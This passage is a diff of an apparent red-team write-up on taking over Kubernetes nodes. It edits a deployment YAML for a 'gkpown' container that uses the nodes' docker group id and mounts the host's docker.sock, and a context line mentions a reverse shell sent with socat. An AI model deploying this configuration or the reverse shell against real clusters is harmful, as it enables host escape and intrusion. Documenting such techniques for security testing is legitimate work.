@@ -10,18 +10,20 @@ Whem the docker container starts it sends a reverse shell with socat to the spec
 
 At this point we have direct access to the docker. The fun part of the deal though is that the deployment also assigned the container the same group id as the kubernetes noes, like this:
 
-(...)
- spec:
-      securityContext:
-        fsGroup: 412    # Group ID of docker group on k8s nodes.
-      containers:
-        - name: gkpown
-          image: jordimiralles/redteam-gkpown
-          imagePullPolicy: Always
-          volumeMounts:
-            - name: dockersock 
-mountPath: "/var/run/docker.sock"
-(...)
+        spec:
+          securityContext:
+            fsGroup: 412    # Group ID of docker group on k8s nodes.
+          containers:
+            - name: gkpown
+              image: jordimiralles/redteam-gkpown
+              imagePullPolicy: Always
+              volumeMounts:
+                - name: dockersock 
+                  mountPath:   "/var/run/docker.sock"
+          volumes:
+          - name: dockersock 
+            hostPath:
+    path: /var/run/docker.sock
 
 So we should have access to all the node context.You can check it very easily:
     
